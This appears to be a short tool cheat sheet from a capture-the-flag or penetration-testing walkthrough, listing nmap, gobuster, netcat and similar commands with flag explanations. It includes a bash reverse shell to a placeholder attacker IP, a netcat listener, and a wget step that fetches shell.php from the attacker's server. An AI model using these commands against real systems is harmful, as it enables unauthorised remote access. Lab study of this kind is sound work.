## Tool Footprint

---

#### nmap


```
nmap -sC -sV <Target IP>
```
>-sC: Runs the default script set (same as --script=default).

>-sV: Examines open ports to identify the service and version running on them.

---

#### gobuster

```
gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/big.txt
```
```
gobuster dir -u http://<Target VHost> -w /usr/share/wordlists/dirb/big.txt
```
> dir - the classic directory brute-forcing mode

>-u, --url string  

> -w, --wordlist string

---

#### python (server)



```
python3 -m http.server 5555
```

>-m module‐name

---

#### wget



```
wget http://IP:5555/shell.php
```

>Syntax: wget [option]... [URL]...

---

#### netcat


```
netcat -lvnp 4444
```
```
netcat -lvnp 1234
```
> -l    Enables listening mode, allowing the tool to wait for incoming connections.

> -v     Produces more detailed output. Use it twice for extra verbosity.

> -n     Uses numeric IP addresses only, skipping DNS lookups.

> -p    port
>>Sets the local port to use. Accepts a single port or a range (lo–hi).

---
#### script



```
/usr/bin/script -qc /bin/bash /dev/null
```

> -q, --quiet
>>Be quiet


> -c, --command command

---
#### bash 



```
bash -l >& /dev/tcp/<ATTACK MACHINE IP>/<PORT> 0>&1
```

> -l -> Make bash act as a login shell


---
